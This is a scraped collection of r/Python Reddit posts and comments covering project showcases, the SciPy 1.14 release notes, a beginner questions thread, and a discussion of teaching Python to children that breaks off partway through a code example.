    "post_title": "Drawing Mona Lisa with 256 circles using evolution [Github repo in comments]",
    "media": [
        "https://external-preview.redd.it/Ftbw2RJh4ZOJXm3emL9AI4SWaOa51--wJQZbJ-Ggc4s.png?width=640&crop=smart&format=pjpg&auto=webp&s=db37b15d03581808e2ae722d2ca8f8df91b27b85"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Itwist101",
            "score": "235",
            "content": "[Github] https://github.com/ahmedkhalf/Circle-Evolution"
        },
        {
            "author": "ColdFire75",
            "score": "207",
            "content": "",
            "replies": [
                {
                    "author": "Itwist101",
                    "score": "51",
                    "content": ""
                }
            ]
        },
        {
            "author": "Symbiotaxiplasm",
            "score": "97",
            "content": "Love that the solver couldn't figure out Mona Lisa's smile either"
        },
        {
            "author": "oyster_brain",
            "score": "28",
            "content": "Fun project! Congrats! I didn't read the code, yet I'm wondering: what kind of compression rate do you achieve?"
        }
    ]
},
{
    "post_author": "raffulz",
    "post_id": "1dmvqc4",
    "post_score": "22",
    "post_time": "Sunday, June 23, 2024 at 11:41:52 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Extending an Isolated Embedded Interpreter in C++",
    "media": [
        "https://docs.python.org/3/whatsnew/3.12.html#pep-684-a-per-interpreter-gil",
        "https://github.com/bytemarx/exaplot"
    ],
    "post_content": "So this post is a bit different than a typical project showcase in that I wanted to share an example of extending an isolated embedded Python interpreter (complete with a sub-interpreter-compatible C++ extension module) rather than the project itself.\nWith the release of Python 3.12, support for creating sub-interpreters with their own GIL was added. I wanted to try this out, and so used this as an excuse to rewrite an older project (it also allowed me to correct some not-so-great architectural decisions as well as try out some additional Python features). I'm a big fan of using Python as a scripting language in larger projects and I hadn't really found any such projects use more of the modern embedding API (most of the popular projects that embed an interpreter had implemented it many years ago when the API wasn't as refined, and each have their own ways of doing things). So I hope by sharing this that others can use it as a reference if they'd want to do something similar (or perhaps you might even find a use for the project itself).\nGitHub link\nWhat My Project Does\nThis project is a rewrite of an older project that was used in the acquisition and monitoring of data (collected from various sensors, instruments, etc.) in a laboratory setting. Before we had something like this, each experiment's code required a lot of boilerplate necessary for the GUI and data collection. We wanted something that could abstract all of that away so that what was left was only the logic necessary for actually running the experiment with a simple interface to execute it. This project is by no means novel with regard to plotting real-time data in Python, as there are numerous other projects that do just that (however, I didn't find anything quite like this when the original was conceived). This project is also not meant as a means of displaying data in a particular way as its primary purpose was to collect and monitor—presentation can be handled during post-processing with tools more suited for data presentation.\nTarget Audience\nresearchers\nstudents\nanybody with a need/desire for real-time data collection\nComparison\nHere's a very trivial example of what a script that collects and plots data might look like:\nimport math\n\nfrom exaplot import datafile, init, plot, stop\n\n# Initialize the data file and plots (we'll just use the default\n# settings for each), and set parameters for the 'run' function.\ndatafile()\ninit(frequency=5.0)\n\n\ndef run(frequency: float):\n    x = -10.0\n    while x <= 10.0 and not stop():\n        y = 10 * math.sin(frequency * x) * math.exp(-x**2 / 10.0)\n        plot[1](x, y)\n        x += 0.001\nThis example simply sets up an output file and a plot and collects/plots data points. In a real-world scenario, the data we'd be collecting/plotting would come from some external source, but I'd say this exemplifies pretty well how minimal we can get to setting up a plot and plotting to it.",
    "comments": [
        {
            "author": "Obliterative_hippo",
            "score": "4",
            "content": "",
            "replies": [
                {
                    "author": "raffulz",
                    "score": "2",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1doks2x",
    "post_score": "3",
    "post_time": "Wednesday, June 26, 2024 at 3:00:07 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "brennancurrier",
            "score": "3",
            "content": "Which UI library should I learn for general desktop apps/tools. Preferably a modern looking one with a lot of control types",
            "replies": [
                {
                    "author": "Ok-Frosting7364",
                    "score": "5",
                    "content": "PyQT is very popular and worth learning. Textual is great for user interface apps you can run from the command-line. I made an app in it recently."
                },
                {
                    "author": "jer_re_code",
                    "score": "3",
                    "content": "i would personally more suggest kivy but that's mostly a matter of tatse and that it also works with and has tools for app packaging 📦 for all platforms from Windows over iOS and macOS to Android it can be compatible to all of these because it uses its own gui elements and framework wich does make it work on its own but it means apps wont be as beautiful (doesn't mean they cannot only that they arent from the get go) as with os specific app creation frameworks."
                }
            ]
        },
        {
            "author": "odett1102",
            "score": "1",
            "content": "Is it more common to use double quotes or single quotes for strings? I would like to know the recommended approach and the most used by the community",
            "replies": [
                {
                    "author": "ARRgentum",
                    "score": "2",
                    "content": "use a formatter like black for stuff like that ;)"
                }
            ]
        },
        {
            "author": "MathematicianRude467",
            "score": "1",
            "content": "Are there any places that you can go to have a professional look over your code. Like more in the sense of code optimization and security rather than trying to fix bugs. The one place I can think of is Fiverr but that place always seems to be hit or miss so I'd like to look for something more reliable."
        },
        {
            "author": "duriani",
            "score": "1",
            "content": "I got the error for this code yesterday. (it was about \"sum\" fuction) But suddenly it works well. I am using co lab. Is it possible?? test_list = [1, 2, 3] print(sum(test_list))"
        },
        {
            "author": "Junior-Meringue-8745",
            "score": "1",
            "content": "I want to start over with my python installation. I installed libraries globally and fucked up my sys (sys.path.append(\"..\")). Some of my libraries and dependencies aren't working now. Someone told me to use virtual enviroments and git, what are these and how do I implement them?"
        },
        {
            "author": "jealousjockey",
            "score": "1",
            "content": "I get Èinvalid syntaxÈ whenever i try to download midiutil using pip how do i fix itÉ i have python installed which automatically installed pip.",
            "replies": [
                {
                    "author": "jer_re_code",
                    "score": "2",
                    "content": "can you provide either a full screenshot or the text of the error msg and please also guve some context about your python version and pip version because they could be at the wrong version wich you can take a look at via the commands: python -V pip -V if you are using your python on a non unusual device please also give context on how tht is realised and on what device Pip syntax pip install … # install a package (…)"
                }
            ]
        }
    ]
},
{
    "post_author": "ExternalUserError",
    "post_id": "1dr7xfu",
    "post_score": "60",
    "post_time": "Saturday, June 29, 2024 at 1:08:07 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PuePy - Reactive Frontend Framework",
    "media": [
        "https://puepy.dev/",
        "https://docs.puepy.dev/",
        "https://github.com/pyscript/ltk",
        "https://shoelace.style/",
        "https://reflex.dev/",
        "https://www.django-unicorn.com/",
        "https://github.com/kkinder/expenselemur",
        "http://github.com/kkinder/puepy",
        "https://pyscript.net/",
        "https://expenselemur.com/",
        "https://flet.dev/"
    ],
    "post_content": "What PuePy Project Does\nPuePy builds on PyScript (Python+Webassembly) to offer something similar to Vue.js or React, but in 100% pure Python. It supports PyScript's two runtimes: MicroPython and Pyodide. MicroPython is tiny, while Pyodide is basically CPython.\nTarget Audience\nPresumably anyone who wants to have a web project where they code the frontend in Python, not JavaScript. This might be a limited number of people, however, because it does mean you'll miss out on JavaScript tooling (eg, in-browser debuggers), JavaScript projects, etc.\nYou can, however, make use of web components like Shoelace.style, so you're not necessarily starting from scratch.\nComparison\nThere are a lot of Python \"frontend\" options, though none I'm aware of are quite like PuePy.\nReflex lets you define React-style logic in Python and it runs in the browser. It doesn't, however, let you have a full Python environment on the client.\nLTK is a GUI toolkit written with PyScript that you could use to build powerful frontend frameworks. However, it isn't reactive and does presume you're going to use it as a toolkit in a roughly similar way to how you'd use Gtk or Qt, but on the web.\nFlet is a Flutter wrapper in Python where a thin JavaScript later \"renders\" Flutter widgets laid out in server code. It also lets you write frontend code in Python.\nDjango Unicorn does some magic to let you render HTML code server-side, but have it update. It's Django-only, and doesn't actually run Python code on the frontend.\nLinks\nPuePy.dev site and GitHub repo\nDocs\nDemo PWA (in progress; not all assets cached correctly): Keep track of expenses with friends when traveling ExpenseLemur (see GitHub repo)",
    "comments": [
        {
            "author": "rumnscurvy",
            "score": "15",
            "content": "Holy crap I did not know about django unicorn, it seems like a massive timesaver",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "4",
                    "content": "It is pretty cool. It’s a lot of magic, but it works well."
                }
            ]
        },
        {
            "author": "EddieLomax",
            "score": "4",
            "content": "Nice! I’m currently playing around with Ludic. https://getludic.dev"
        },
        {
            "author": "SalMolhado",
            "score": "3",
            "content": "I too like IPAs",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "4",
                    "content": "🍻"
                }
            ]
        },
        {
            "author": "SalMolhado",
            "score": "3",
            "content": "do you know about https://htpy.dev ? It is pretty flexible",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "3",
                    "content": "I did not know about that, thanks! I might have reused that, though I do like the flexibility of context managers because you can insert logic with regular if statements or loops while deeply nested."
                },
                {
                    "author": "Ikinoki",
                    "score": "2",
                    "content": "Ooff I did this with PHP 2 decades ago... It is rough to use later :)",
                    "replies": [
                        {
                            "author": "SalMolhado",
                            "score": "1",
                            "content": "it fits quite nicely with htmx/datastar when you don’t do everything in it"
                        }
                    ]
                }
            ]
        },
        {
            "author": "imbev",
            "score": "3",
            "content": "PuePy.dev: \"Slow 3G\" - 28.74 Seconds \"Fast 3G\" - 8.17 Seconds \"No Throttling\" - 0.746 Seconds This is very encouraging, a real alternative to Javascript frontend frameworks",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "3",
                    "content": "Well, the MicroPython runtime is ~300KB. Then it also has to pull in zip code to unzip the wheel file, and some other stuff. With Bulma and highlight.js, PuePy.dev is still under a meg, so not that bad. It's manageable with MicroPython, but not lightning fast on slow connections. With Pyodide, it's rougher. If you pull in Pyodide and the standard library, that alone is 5-6MB. That might be feasible for internal line of business software you use only in house, or where it just is going to be a web site that has to \"load\", but yeah, it's rough."
                }
            ]
        },
        {
            "author": "fohrloop",
            "score": "2",
            "content": "Looks like a cool library! Definitely looking forward to trying this in a project. Starred."
        },
        {
            "author": "AustinCorgiBart",
            "score": "2",
            "content": "Might also compare to Drafter: https://drafter-edu.github.io/drafter/quickstart/quickstart.html"
        },
        {
            "author": "TheGrapez",
            "score": "2",
            "content": "I've been trying to learn front end as someone who only knows python & sql. I was learning Reflex the past few weeks regularly, and have tried all the other frameworks. Looking forward to diving deep into this!",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "2",
                    "content": "Reflex is really cool."
                }
            ]
        },
        {
            "author": "riklaunim",
            "score": "2",
            "content": "SPA router... would be nice to see a routed SPA demo, as it may be quite interesting.",
            "replies": [
                {
                    "author": "Gigusx",
                    "score": "2",
                    "content": "https://docs.puepy.dev/a-full-app-template.html The working demo has routing implemented. There's also a tutorial for routing specifically, also with a live demo. Nice job @OP"
                }
            ]
        },
        {
            "author": "ExdigguserPies",
            "score": "1",
            "content": "I'm really interested in this, it looks very useful. But as someone who has zero experience with pyscript, the documentation seems a little lacking. For example with the basic tutorial it walks you through how to create a basic app which is great, but then stops short of showing how to actually run it. I assume this would come from familiarity with pyscript apps. It would be nice to include a short piece of text on how to run the app, or at least link to the pyscript docs section on how to do this. I think adding the part about running python3 -m http.server on this page would be a good start.",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "1",
                    "content": "To be clear, PyScript is a separate project (see pyscript.net). It has its own documentation and PuePy is meant to build on top of it. Having said that, PuePy's documentation is definitely pretty early, especially if you aren't at least somewhat familiar with the technology. In terms of actually running it, I had in mind the installation and pyscript.com test environments should be enough. Since it's a web technology, it runs entirely within your browser."
                }
            ]
        },
        {
            "author": "Fluid_Willow_8758",
            "score": "1",
            "content": "Gosh darn it! Django Unicorn seems like a huge time-saver, something I was unaware of."
        },
        {
            "author": "Fluid_Willow_8758",
            "score": "1",
            "content": "The link to the documents is broken. Furthermore, I consider benchmark claims to be entirely incorrect whenever I encounter them in the absence of any code or data. Furthermore, based on the scant explanation in the README, your benchmarking methodology raises a lot of red flags.",
            "replies": [
                {
                    "author": "ExternalUserError",
                    "score": "1",
                    "content": "There’s no benchmark at all(?). The docs link works well for me. Where did you see a broken link?"
                }
            ]
        }
    ]
},
{
    "post_author": "atqm-",
    "post_id": "hqc7ol",
    "post_score": "5691",
    "post_time": "Monday, July 13, 2020 at 12:27:37 PM GMT+3",
    "flair_text": "",
    "post_title": "I made a simulation using Python in which a neural network learns to race",
    "media": [
        "https://external-preview.redd.it/ycVK6CK8dFFdGbM6ew92YP_Nofj2mpxdckkUka36r2o.png?width=640&crop=smart&format=pjpg&auto=webp&s=54d8a89d087c4055519ac00e205de2bb7dc70d3e"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "DmitryBalabka",
            "score": "297",
            "content": "It would be great to show an animation example of how the trained model performs on an unseen track.",
            "replies": [
                {
                    "author": "atqm-",
                    "score": "121",
                    "content": "It would be! Thank you for the idea :)",
                    "replies": [
                        {
                            "author": "POTUS",
                            "score": "153",
                            "content": "You might want to train on randomly generated tracks. There’s a fair chance that you’ve trained these bots to ignore all input and instead turn left for a fixed period of time and then turn right. It’s called overfitting your model. That would be a good way to find the most efficient path through one individual track, but that’s probably not what you’re going for.",
                            "replies": [
                                {
                                    "author": "b10011",
                                    "score": "36",
                                    "content": "It's highly likely that the neural network does not take time into account (doesn't have access to it). But overfitting could happen, because it might learn the specific distances at specific turns that wouldn't appear on another track."
                                },
                                {
                                    "author": "[deleted]",
                                    "score": "7",
                                    "content": "Dang, beat me to it. My first thought was: What information does the model have access to?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "atqm-",
            "score": "108",
            "content": "Longer version on Youtube Tools: pyglet for graphics numpy for nn EDIT: Thank you guys for all the feedback! This is my first bigger programming project and I'm glad you like it. There is a lot of source code requests and I am currently working on it. My code is a mess because I never really thought I would share this project with someone. Its also written in czech :D When I'm done, I'll make another post. To train the NN I used a simple evolutionary algorithm. Best (fastest) cars in each generation are chosen to be parents of next slightly mutated generation. The NN has 2 hidden layers (5x4x4x2)",
            "replies": [
                {
                    "author": "Sauwan",
                    "score": "49",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "40",
            "content": "Is it on github where we could look at your code in awe?"
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1dnzpx5",
    "post_score": "61",
    "post_time": "Tuesday, June 25, 2024 at 9:54:42 AM GMT+3",
    "flair_text": "News",
    "post_title": "SciPy 1.14 released",
    "media": [
        "https://github.com/scipy/scipy/releases/tag/v1.14.0"
    ],
    "post_content": "SciPy just released version 1.14: https://github.com/scipy/scipy/releases/tag/v1.14.0\nSciPy 1.14.0 Release Notes\nSciPy 1.14.0 is the culmination of 3 months of hard work. It contains many new features, numerous bug-fixes, improved test coverage and better documentation. There have been a number of deprecations and API changes in this release, which are documented below. All users are encouraged to upgrade to this release, as there are a large number of bug-fixes and optimizations. Before upgrading, we recommend that users check that their own code does not use deprecated SciPy functionality (to do so, run your code with python -Wd and check for DeprecationWarning s). Our development attention will now shift to bug-fix releases on the 1.14.x branch, and on adding new features on the main branch.\nThis release requires Python 3.10+ and NumPy 1.23.5 or greater.\nFor running on PyPy, PyPy3 6.0+ is required.\nHighlights of this release\nSciPy now supports the new Accelerate library introduced in macOS 13.3, and has wheels built against Accelerate for macOS >=14 resulting in significant performance improvements for many linear algebra operations.\nA new method, cobyqa, has been added to scipy.optimize.minimize - this is an interface for COBYQA (Constrained Optimization BY Quadratic Approximations), a derivative-free optimization solver, designed to supersede COBYLA, developed by the Department of Applied Mathematics, The Hong Kong Polytechnic University.\nscipy.sparse.linalg.spsolve_triangular is now more than an order of magnitude faster in many cases.",
    "comments": [
        {
            "author": "Over-Programmer1336",
            "score": "4",
            "content": "nice",
            "replies": [
                {
                    "author": "pppossibilities",
                    "score": "1",
                    "content": "nice"
                }
            ]
        },
        {
            "author": "Optimal-Joke",
            "score": "2",
            "content": "This is amazing! Congrats to everyone on the great work. Point of clarification: Apple’s Accelerate library has existed for years. Was something new added recently that made this possible? I’m so excited this is finally here!",
            "replies": [
                {
                    "author": "poppy_92",
                    "score": "2",
                    "content": "Context: https://github.com/scipy/scipy/issues/20691 Scipy had dropped support for accelerate and re-introduced it. Just to remind the reasoning; the more important reason was that Apple dropped support for Accelerate and did not fix any bugs until very recently. Edit: more context: https://github.com/scipy/archive/blob/main/wiki/dropping-accelerate-support.md"
                }
            ]
        },
        {
            "author": "denehoffman",
            "score": "1",
            "content": "I’m actually very excited about the addition of COBYQA, I’m working on some optimization stuff right now and this is very nice to have"
        },
        {
            "author": "Realistic_Being6374",
            "score": "1",
            "content": "I heard about SciPy and many hours later I see this! Coincidence ?"
        }
    ]
},
{
    "post_author": "bleeddonor",
    "post_id": "1dmhjii",
    "post_score": "113",
    "post_time": "Sunday, June 23, 2024 at 11:26:58 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python 3.12 docs include built-in support for themes, including a dark theme!",
    "media": [],
    "post_content": "Python gives you wings, yes, but you used to have to wear aviator glasses to get through the docs on a bright display.\nNo more. :)",
    "comments": [
        {
            "author": "kittydoor",
            "score": "24",
            "content": "Link for the lazy: https://docs.python.org/3/index.html Check top right for Theme selector"
        },
        {
            "author": "shinitakunai",
            "score": "44",
            "content": "You should use DarkReader and forget about support on specific websites",
            "replies": [
                {
                    "author": "elcapitaine",
                    "score": "116",
                    "content": "While I use dark reader, a website offering proper support is going to look better and I'm glad they made the change.",
                    "replies": [
                        {
                            "author": "jkrejcha3",
                            "score": "10",
                            "content": "Yeah, there's been a bunch of cases on websites where the site is decidedly not designed for a dark mode and plugins just make the site look worse and broken than if I'd just used a light theme Poor website design (especially given the new CSS selectors)? Maybe, but I don't always get to choose which sites I interact with (or choosing to do so is worth it for the things I need to get done) It's pretty good, but there are pathological cases"
                        },
                        {
                            "author": "UHasanUA",
                            "score": "5",
                            "content": "Fax"
                        }
                    ]
                },
                {
                    "author": "Negative-Effect-3003",
                    "score": "12",
                    "content": "Doesn't always work as intended"
                },
                {
                    "author": "ImNotClever_Sorry",
                    "score": "3",
                    "content": "Work computer bans all but a select few chrome extensions (and alternate browsers). Kubernetes docs also do not have a dark mode and I was just suffering through that the other day"
                },
                {
                    "author": "yrubooingmeimryte",
                    "score": "2",
                    "content": "DarkReader isn't foolproof. There are many sites where it struggles to present a readable version of the site as a dark mode. It will always be preferable for a website to simply deploy a puprpose built dark theme."
                },
                {
                    "author": "bleeddonor",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "CSI_Tech_Dept",
            "score": "1",
            "content": "But they also broke things by including release changes polluting the search, now every time I search for a documentation for function, I have to scroll through every single version. For example: https://docs.python.org/3/search.html?q=re"
        },
        {
            "author": "stevenjd",
            "score": "-44",
            "content": ""
        }
    ]
},
{
    "post_author": "austindcc",
    "post_id": "1do7lb1",
    "post_score": "10",
    "post_time": "Tuesday, June 25, 2024 at 5:38:39 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "retryhttp - Retry potentially transient HTTP errors in requests and httpx",
    "media": [
        "https://github.com/jd/tenacity",
        "https://github.com/austind/retryhttp"
    ],
    "post_content": "Happy to announce my first public project, retryhttp! Looking for input as I evolve and mature the API.\nWhat my project does: Makes it easier to retry potentially transient HTTP errors when using requests or httpx.\nTarget Audience: Production eventually, beta until API is finalized-- your input is greatly appreciated!\nComparison: Extends tenacity with custom retry and wait strategies, as well as a decorator that wraps tenacity.retry() with sensible (but configurable) defaults.",
    "comments": [
        {
            "author": "thedeepself",
            "score": "3",
            "content": "Extends tenacity with custom retry and wait strategies, Excellent I was concerned that this was redoing all of the retry logic that something else had already done.",
            "replies": [
                {
                    "author": "austindcc",
                    "score": "1",
                    "content": "Nope! Retryhttp is just a convenience layer on top of tenacity"
                }
            ]
        },
        {
            "author": "trnka",
            "score": "1",
            "content": "Looks nice! I could've used this one a project a couple months ago, though I may have needed a way to customize which codes are retryable. In some of the systems, regular 500 wasn't retryable but some of the specific 5xx codes were",
            "replies": [
                {
                    "author": "austindcc",
                    "score": "2",
                    "content": "It’s not in the readme yet but the codes are configurable! So are all the exceptions. Have a look at the docstring for retry_http_errors, on mobile or id link you"
                }
            ]
        }
    ]
},
{
    "post_author": "chandr_andr",
    "post_id": "1dqybfa",
    "post_score": "126",
    "post_time": "Saturday, June 29, 2024 at 3:13:28 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PSQLPy - Asynchronous Python PostgreSQL driver written in Rust",
    "media": [
        "https://github.com/MagicStack/asyncpg",
        "https://qaspen-python.github.io/",
        "https://github.com/psycopg/psycopg",
        "https://github.com/qaspen-python/psqlpy"
    ],
    "post_content": "Hello everyone. We want to present you PSQLPy: our new project that allows communicate with PostgreSQL. Conceptually it's similar to psycopg or asyncpg but fully written in Rust and type hints support.\nWhat Our Project Does\n- Make an interaction with the PostgeSQL in your application much faster (2-3 times).\n- Be sure that there won't be any unexpected errors.\n- Don't usually go to the documentation to search every question - we have awesome docstrings for every component.\n- Use MyPy (or any other Python type checker) with confidence that exactly the types specified in the typing will be returned.\n- Concentrate on writing your code, not understanding new abstractions in this library, we only have classes which represents PostgreSQL object (transaction, cursor, etc).\nTarget Audience\nThe driver is completely ready for production use, supports high-load and fault-tolerant systems\nComparison\nWe conducted a huge number of benchmarks.\nThe results are very promising! PSQLPy is faster than AsyncPG at best by 2 times, at worst by 20%. PsycoPG is 3.5 times slower than our new driver in the worst case, 60% in the best case.\nLinks:\nGithub repo: https://github.com/qaspen-python/psqlpy\nDocs: https://qaspen-python.github.io\nWe would be pleased to see valuable feedback.\nBest regards, PSQLPy team.",
    "comments": [
        {
            "author": "erez27",
            "score": "29",
            "content": "Docs link is broken. Also, whenever I see benchmark claims without any code or data, I assume they are completely wrong. And from the small description you wrote in the README, your method of benchmarking is very suspicious.",
            "replies": [
                {
                    "author": "chandr_andr",
                    "score": "4",
                    "content": "Hello! Docs link is fixed. I understand the skepticism towards benchmarks. We are currently preparing a huge number of benchmarks for display, and we are also using existing ones. You can view a minimal unbiased benchmark that was not made by a member of our team. https://github.com/ymezencev/db_perf In the coming month, the README and documentation will be updated with full benchmarks",
                    "replies": [
                        {
                            "author": "erez27",
                            "score": "7",
                            "content": "That's definitely a start! I suggest different benchmarks for high-throughput (>100mb per query) and for tiny queries. It would also be interesting to see it compared with threaded queries vs async. And ofc include psycopg! Good luck!"
                        }
                    ]
                }
            ]
        },
        {
            "author": "catcint0s",
            "score": "28",
            "content": "2-3 times faster compared to what? The Python or C implementation of psycopg?",
            "replies": [
                {
                    "author": "Spleeeee",
                    "score": "31",
                    "content": "It’s 2-3 times as fast as my 2002 Subaru forester, so it MUST be “blazingly fast”"
                },
                {
                    "author": "chandr_andr",
                    "score": "9",
                    "content": "Hello! Thank you for the question. We've tested C implementation of psycopg."
                }
            ]
        },
        {
            "author": "fortunatefaileur",
            "score": "78",
            "content": "Why be so fluffy? Why not say: memory safe we wrote mypy annotations low level api definitely zero percent faster than existing options for approximately everyone I don’t understand why the standard for Free Software README on Reddit in 2024 is now at about the level of Used Car Salesman, USA, 1987. If your README for something that obviously duplicates fifty existing things doesn’t include a “why not use this” and a “comparison with other things that isn’t all positive”, it’s hard to imagine you really are trying to help the people you’re talking to.",
            "replies": [
                {
                    "author": "chandr_andr",
                    "score": "7",
                    "content": "Hello! Thanks for your suggestions and ideas. We'll definitely improve our reddit post style, README and documentation. Due to “why not use this” and a “comparison with other things that isn’t all positive”, we are a young project and always improve. As I said in the previous comment, you can check not our benchmarks - https://github.com/ymezencev/db_perf. In the coming month, the README and documentation will be updated with full benchmarks"
                }
            ]
        },
        {
            "author": "Hermantic2009",
            "score": "5",
            "content": "Support SQL command or python command?",
            "replies": [
                {
                    "author": "chandr_andr",
                    "score": "5",
                    "content": "Hello! As it's a driver, first of all, we support SQL commands. Anyway, at this moment we are creating integrations with some existing ORMs, so it'll be possible to use Python commands."
                }
            ]
        },
        {
            "author": "Adventurous-Finger70",
            "score": "5",
            "content": "Do you have an exemple of implementation with Sqlalchemy (using asyncio)"
        },
        {
            "author": "Klaarwakker",
            "score": "5",
            "content": "Psycopg has been the only viable driver since forever. Good to see a performant alternative, kudos OP! Will try it out."
        }
    ]
},
{
    "post_author": "Nekose",
    "post_id": "ghxqod",
    "post_score": "5543",
    "post_time": "Tuesday, May 12, 2020 at 1:14:39 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Thanks to everyone’s advice, my mouse drawing algorithm has gotten much better and faster!",
    "media": [
        "https://external-preview.redd.it/xMm15WNKS9gKvOyskAElkPpFi6FEJOLyHPNWlirASyw.png?width=640&crop=smart&format=pjpg&auto=webp&s=6150e4ad70bf6c1dcd530c52df778b0f3e289491"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "TheBlackCat13",
            "score": "1264",
            "content": "",
            "replies": [
                {
                    "author": "shark098",
                    "score": "270",
                    "content": ""
                }
            ]
        },
        {
            "author": "Nekose",
            "score": "298",
            "content": ""
        },
        {
            "author": "Maruaz",
            "score": "208",
            "content": "Cries in ‘Hello World’"
        },
        {
            "author": "SushiWithoutSushi",
            "score": "47",
            "content": "Wow! Looks incredible! How did you bypass the speed limitations that you commented in the last post?"
        }
    ]
},
{
    "post_author": "finallyanonymous",
    "post_id": "1dmpwl0",
    "post_score": "7",
    "post_time": "Sunday, June 23, 2024 at 7:22:45 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "[Tutorial] A Complete Guide to Pytest Fixtures",
    "media": [
        "https://betterstack.com/community/guides/testing/pytest-fixtures-guide/"
    ],
    "post_content": "This article explores how to use Pytest fixtures to write cleaner & more maintainable tests, avoid redundant code, and prevent flakiness.",
    "comments": []
},
{
    "post_author": "Ok-Frosting7364",
    "post_id": "1do332s",
    "post_score": "16",
    "post_time": "Tuesday, June 25, 2024 at 1:50:26 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Python wrapper for getting space data from Australia's official weather service",
    "media": [
        "https://github.com/ben-n93/pyspaceweather"
    ],
    "post_content": "Source code: https://github.com/ben-n93/pyspaceweather\nWhat my Project Does\nI'm really proud to have made this. Not sure if it will be of use to anyone but it's a wrapper around the Australian Bureau of Meteorology's Space Weather API, which provides space weather data for Australia.\nTarget Audience\nAnyone interested in space weather data!\nThanks!",
    "comments": [
        {
            "author": "c0d3monk",
            "score": "2",
            "content": "good one"
        }
    ]
},
{
    "post_author": "redditNewUser2017",
    "post_id": "f55076",
    "post_score": "4531",
    "post_time": "Monday, February 17, 2020 at 10:12:31 AM GMT+3",
    "flair_text": "",
    "post_title": "I've made a 3D scanner that's fully automated using Python script on Android phone!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "redditNewUser2017",
            "score": "211",
            "content": "All the source code and 3d model files are available on Thingiverse: https://www.thingiverse.com/thing:4167615 The time-consuming photo taking process of the 3D scanner is automated using Arduino and Android script. The communication is carried on WiFi through a simple TCP channel. This is an open source project. Suggestions are welcome!",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "65",
                    "content": "Fantastic project! Would be great to have a version of this on Github, and also to have the instructions you provided on the website to be included on README.txt",
                    "replies": [
                        {
                            "author": "redditNewUser2017",
                            "score": "78",
                            "content": "I just did! Find the Github page here: https://github.com/QLRO/AA-Scan/tree/master.",
                            "replies": [
                                {
                                    "author": "GloriousDioxide",
                                    "score": "31",
                                    "content": "Woah tiny amount of code! great work!"
                                }
                            ]
                        },
                        {
                            "author": "Legorooj",
                            "score": "-2",
                            "content": "Do a rich text doc, like Markdown or reST. They look better."
                        }
                    ]
                }
            ]
        },
        {
            "author": "poopagandist",
            "score": "89",
            "content": ""
        },
        {
            "author": "BillieRubenCamGirl",
            "score": "69",
            "content": ":O :O :O This is INCREDIBLE!!! Can I add this to the r/3Dprinting wiki?",
            "replies": [
                {
                    "author": "redditNewUser2017",
                    "score": "36",
                    "content": "Sure. I also posted this on r/3dprinting too. If you visit that sub often you may remember some of my previous posts."
                }
            ]
        }
    ]
},
{
    "post_author": "pdfisk",
    "post_id": "1dqstt2",
    "post_score": "44",
    "post_time": "Friday, June 28, 2024 at 11:02:59 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Thoughts on Teaching Python to Children",
    "media": [
        "https://scratch.mit.edu/statistics/",
        "http://vistapython.com/",
        "https://scratch.mit.edu/"
    ],
    "post_content": "MIT's Scratch is a very successful online environment for teaching kids to program. The statistics give an idea of how popular it is - for example, 36 million unique visitors last month.\nIt enables visitors to create stories using a visual \"drag-and-drop\" language and to post their creations to a public gallery. It also allows creators to add \"remix\" code from other students as well.\nThe \"Scratch\" programming language has no commercial uses that I am aware of, so people must be visiting the site just for the pure pleasure of learning to program and sharing what they produce with others.\nThere is a wide age distribution of ages of the people visiting the Scratch site but there is a peak at about age 12 after which it falls quite rapidly.\nI think that there are several reasons for the popularity of Scratch:\nit is easy to learn and understand\nthere is nothing to install or set up\nyou can start by modifying existing examples\nyou can share what you have created by simply pressing \"Save\"\nstories can be visually exciting with lots of animation effects\nScratch is written in JavaScript and can run on mobile devices\nWhen comparing this to Python, I think that Items 1-4 in the list above are similar for both languages.\nAs for item 5, Python can also produce visually exciting applications when partnered with the appropriate external libraries.\nI think that the most important distinction between the two languages is the issue of deployment. In Scratch deployment is very easy because it can be deployed to web browsers.\nHere is a short story written in Python that may be suitable for a simple learning exercise.\nThe story is about a young chick (named Chicklet) who leaves his mother (Henrietta the hen) to visit their neighbor (Rusty the dog).\nYou can run this by visiting vistapython.com and choosing 000_example_04 from the project list.\n# 000_example_04\n\n# Chicklet visits Rusty\n\nchick_col = 0\nchick_row = 0\nhen_row = 0\nhen_col = 0\nrusty_col = 6\nrusty_row = 0\nsize = 7\n\nautotab('board')\nboard('set_size', size)\n\ndef show_hen_and_chick():\n    popup('toast', 'Chicklet is home with Henrietta, his mother...')\n    sleep(2)\n    board('set_tile_image', hen_row, hen_col, 'hen_with_chick.jpg')\n    sleep(2)\n    \ndef add_rusty():\n    popup('toast', 'Rusty is in his dog house...')\n    sleep(2)\n    board('set_tile_image', rusty_row, rusty_col, 'dog_at_home.png')\n    sleep(2)\n    \ndef turn_chick_left():\n    